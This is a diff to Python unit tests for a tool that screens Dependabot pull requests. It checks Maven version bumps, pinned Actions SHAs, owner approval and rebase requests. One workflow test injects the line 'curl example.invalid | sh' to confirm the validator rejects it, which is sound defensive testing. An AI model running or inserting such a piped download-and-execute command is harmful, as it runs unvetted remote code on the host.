@@ -15,12 +15,16 @@ from dependency_governance import (
     parse_dependabot_metadata,
     parse_positive_integer,
     reconcile_independently,
+    reconcile_with_base_convergence,
     render_comment,
     select_qualification_run,
     validate_actions_semantic_change,
     validate_config,
-    validate_maven_manual,
+    validate_maven_semantic_change,
     validate_provenance,
+    ensure_owner_review_and_approval,
+    has_exact_owner_approval,
+    request_dependabot_refresh,
     validate_signed_metadata,
     workflow_identity_matches,
 )
@@ -210,10 +214,81 @@ class DependencyGovernanceTests(unittest.TestCase):
             "unknown",
         )
 
-    def test_maven_is_deliberately_manual_due_to_model_and_lifecycle_scope(self) -> None:
-        result = validate_maven_manual(CONFIG)
-        self.assertFalse(result["eligible"])
-        self.assertIn("dependency versions, shared family properties, BOM management", result["reasons"][0])
+    def test_maven_signed_patch_versions_are_semantically_eligible(self) -> None:
+        before = """<project>
+  <properties>
+    <jackson.version>2.22.2</jackson.version>
+  </properties>
+  <dependencyManagement>
+    <dependencies>
+      <dependency>
+        <groupId>com.fasterxml.jackson</groupId>
+        <artifactId>jackson-bom</artifactId>
+        <version>${jackson.version}</version>
+      </dependency>
+    </dependencies>
+  </dependencyManagement>
+  <dependencies>
+    <dependency>
+      <groupId>org.slf4j</groupId>
+      <artifactId>slf4j-simple</artifactId>
+      <version>2.0.19</version>
+    </dependency>
+  </dependencies>
+</project>"""
+        after = before.replace("2.22.2", "2.22.3").replace("2.0.19", "2.0.20")
+        metadata = [
+            {
+                "name": "com.fasterxml.jackson:jackson-bom",
+                "version": "2.22.3",
+                "updateType": "version-update:semver-patch",
+            },
+            {
+                "name": "org.slf4j:slf4j-simple",
+                "version": "2.0.20",
+                "updateType": "version-update:semver-patch",
+            },
+        ]
+        result = validate_maven_semantic_change(before, after, metadata, CONFIG)
+        self.assertTrue(result["eligible"], result["reasons"])
+        self.assertEqual(
+            {change["name"] for change in result["changes"]},
+            {"com.fasterxml.jackson:jackson-bom", "org.slf4j:slf4j-simple"},
+        )
+
+    def test_maven_rejects_plugins_structure_unsigned_and_major_changes(self) -> None:
+        base = """<project>
+  <properties>
+    <jackson.version>2.22.2</jackson.version>
+  </properties>
+  <dependencyManagement>
+    <dependencies>
+      <dependency>
+        <groupId>com.fasterxml.jackson</groupId>
+        <artifactId>jackson-bom</artifactId>
+        <version>${jackson.version}</version>
+      </dependency>
+    </dependencies>
+  </dependencyManagement>
+  <build><plugins><plugin>
+    <groupId>org.apache.maven.plugins</groupId>
+    <artifactId>maven-surefire-plugin</artifactId>
+    <version>3.6.0</version>
+  </plugin></plugins></build>
+</project>"""
+        signed = [{
+            "name": "com.fasterxml.jackson:jackson-bom",
+            "version": "2.22.3",
+            "updateType": "version-update:semver-patch",
+        }]
+        plugin = base.replace("3.6.0", "3.6.1")
+        self.assertFalse(validate_maven_semantic_change(base, plugin, signed, CONFIG)["eligible"])
+        major = base.replace("2.22.2", "3.0.0")
+        self.assertFalse(validate_maven_semantic_change(base, major, [{
+            **signed[0], "version": "3.0.0", "updateType": "version-update:semver-major",
+        }], CONFIG)["eligible"])
+        structure = base.replace("</properties>", "    <new.policy>true</new.policy>\n  </properties>")
+        self.assertFalse(validate_maven_semantic_change(base, structure, signed, CONFIG)["eligible"])
 
     def test_action_line_requires_immutable_sha_and_version_annotation(self) -> None:
         good = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1"
@@ -267,25 +342,27 @@ class DependencyGovernanceTests(unittest.TestCase):
         self.assertFalse(result["eligible"])
         self.assertIn("outside an immutable uses reference", "\n".join(result["reasons"]))
 
-    def test_security_and_governance_workflows_are_manual_control_plane(self) -> None:
+    def test_protected_workflow_allows_only_exact_signed_action_pin_transition(self) -> None:
         for file in (
             ".github/workflows/security.yml",
             ".github/workflows/dependency-governance.yml",
         ):
             before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
             after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
-            metadata = [
-                {
-                    "name": "actions/checkout",
-                    "version": "7.0.2",
-                    "updateType": "version-update:semver-patch",
-                }
-            ]
+            metadata = [{
+                "name": "actions/checkout",
+                "version": "7.0.2",
+                "updateType": "version-update:semver-patch",
+            }]
             result = validate_actions_semantic_change(
                 [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
             )
+            self.assertTrue(result["eligible"], result["reasons"])
+            mutated = after + "  - run: curl example.invalid | sh\n"
+            result = validate_actions_semantic_change(
+                [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
+            )
             self.assertFalse(result["eligible"])
-            self.assertIn("control plane", "\n".join(result["reasons"]))
 
     def test_version_comparison_treats_zero_minor_as_breaking_risk(self) -> None:
         self.assertEqual(compare_versions("7.0.1", "7.0.2"), "patch")
@@ -362,7 +439,7 @@ class DependencyGovernanceTests(unittest.TestCase):
             ecosystem="maven",
             provenance={"eligible": True, "reasons": [], "commit": commit},
             metadata={"eligible": True, "reasons": [], "metadata": []},
-            semantic=validate_maven_manual(CONFIG),
+            semantic={"eligible": False, "reasons": ["fixture manual block"], "changes": []},
             qualification={
                 "allSuccess": False,
                 "anyFailed": False,
@@ -373,8 +450,103 @@ class DependencyGovernanceTests(unittest.TestCase):
             },
         )
         body = render_comment(assessment, CONFIG)
-        self.assertIn("never regenerates Python locks", body)
+        self.assertIn("never rewrites Dependabot branches directly", body)
         self.assertIn("MANUAL / WAIT", body)
+
+    def test_owner_review_refresh_and_approval_are_exact_head_and_idempotent(self) -> None:
+        class OwnerApi:
+            def __init__(self, login: str, user_id: int) -> None:
+                self.identity = {"login": login, "id": user_id}
+                self.comments: list[dict] = []
+                self.reviews: list[dict] = []
+
+            def get(self, path: str):
+                if path != "https://api.github.com/user":
+                    raise AssertionError(path)
+                return self.identity
+
+            def paginate(self, path: str):
+                if path.endswith("/comments"):
+                    return self.comments
+                if path.endswith("/reviews"):
+                    return self.reviews
+                raise AssertionError(path)
+
+            def post(self, path: str, payload: dict):
+                if path.endswith("/comments"):
+                    self.comments.append({"body": payload["body"], "user": self.identity})
+                    return {}
+                if path.endswith("/reviews"):
+                    self.reviews.append({
+                        "state": "APPROVED",
+                        "commit_id": payload["commit_id"],
+                        "user": self.identity,
+                    })
+                    return {}
+                raise AssertionError(path)
+
+        base, head, pull, commit = canonical_fixture()
+        assessment = Assessment(
+            pull=pull,
+            base_sha=base,
+            files=[{"filename": ".github/workflows/ci.yml"}],
+            ecosystem="github-actions",
+            provenance={"eligible": True, "reasons": [], "commit": commit},
+            metadata={"eligible": True, "reasons": [], "metadata": []},
+            semantic={"eligible": True, "reasons": [], "changes": []},
+            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
+        )
+        owner = OwnerApi(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
+        ensure_owner_review_and_approval(owner, assessment, CONFIG)
+        self.assertTrue(has_exact_owner_approval(owner, pull["number"], head, CONFIG))
+        ensure_owner_review_and_approval(owner, assessment, CONFIG)
+        self.assertEqual(len(owner.comments), 1)
+        self.assertEqual(len(owner.reviews), 1)
+
+        stale = Assessment(
+            pull=pull,
+            base_sha="c" * 40,
+            files=assessment.files,
+            ecosystem=assessment.ecosystem,
+            provenance={
+                "eligible": False,
+                "reasons": ["PR is not rebased directly on the current base branch head"],
+                "commit": commit,
+            },
+            metadata=assessment.metadata,
+            semantic=assessment.semantic,
+            qualification=assessment.qualification,
+        )
+        self.assertTrue(request_dependabot_refresh(owner, stale, CONFIG))
+        self.assertIn("@dependabot rebase", owner.comments[-1]["body"])
+        before = len(owner.comments)
+        self.assertTrue(request_dependabot_refresh(owner, stale, CONFIG))
+        self.assertEqual(len(owner.comments), before)
+
+        with self.assertRaises(GovernanceError):
+            ensure_owner_review_and_approval(
+                OwnerApi("github-actions[bot]", 41898282), assessment, CONFIG
+            )
+
+    def test_base_convergence_revisits_earlier_pr_after_later_merge(self) -> None:
+        open_pulls = [{"number": 1}, {"number": 2}]
+        visits: list[int] = []
+
+        def list_pulls() -> list[dict]:
+            return [dict(item) for item in open_pulls]
+
+        def processor(pull: dict) -> dict:
+            visits.append(pull["number"])
+            if pull["number"] == 2:
+                open_pulls[:] = [item for item in open_pulls if item["number"] != 2]
+                return {"merged": True}
+            return {"merged": False}
+
+        results, failures, passes = reconcile_with_base_convergence(list_pulls, processor)
+        self.assertEqual(visits, [1, 2, 1])
+        self.assertEqual(passes, 2)
+        self.assertEqual(failures, [])
+        self.assertEqual([(n, p) for n, _, p in results], [(1, 1), (2, 1), (1, 2)])
 
     def test_privileged_workflow_never_checks_out_dependabot_head(self) -> None:
         workflow = (
@@ -382,7 +554,9 @@ class DependencyGovernanceTests(unittest.TestCase):
         ).read_text(encoding="utf-8")
         self.assertIn("pull_request_target:", workflow)
         self.assertIn("workflow_run:", workflow)
+        self.assertIn("push:", workflow)
         self.assertIn("schedule:", workflow)
+        self.assertIn("DEPENDABOT_OWNER_TOKEN", workflow)
         self.assertIn("ref: ${{ github.event.repository.default_branch }}", workflow)
         self.assertIn("persist-credentials: false", workflow)
         self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head")
